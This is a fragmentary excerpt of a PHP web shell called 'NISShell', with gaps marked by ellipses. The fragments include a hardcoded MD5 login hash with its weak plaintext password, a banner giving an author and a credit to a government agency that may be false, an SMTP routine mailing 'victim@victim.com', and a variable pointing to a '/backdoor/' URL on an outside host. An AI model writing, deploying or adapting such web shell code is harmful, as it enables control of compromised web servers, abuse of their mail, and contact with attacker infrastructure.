...
$login_password= 'e10adc3949ba59abbe56e057f20f883e'; // Password => 123456
...
$intro="<center><table border=0 style=\"border-collapse: collapse\" bordercolor=\"#282828\"><tr><td bgcolor=\"#666666\"><b>Script:</b><br>".str_repeat("-=-",25)."<br><b>Name:</b> NISShell<br><b>Version:</b> $v<br><br><b>Author:</b> BSSNRI<br>".str_repeat("-=-",25)."<br><b>Name:</b> NISShell<br><b>Country:</b> Indonesia<br><b>Website:</b> <a href=\"https://nainsec.pro.net\" target=\"_blank\">https://nainsec.pro.net</a><br><b>Email:</b> <a href=\"mailto:master@nainsec.pro.net?subject=NISShell\">master@nainsec.pro.net</a><br></font>$et</center>";
$footer="${msgbox}NISShell v$v - Powered By <a href=\"https://bssn.go.id\" target=\"_blank\">BSSNRI</a>$et";
...
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"RCPT TO: <victim@victim.com>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"DATA\r\n");
$res=substr(fgets($sock,512),0,3);
...
$addr='https://nainsec.pro.net/backdoor/';
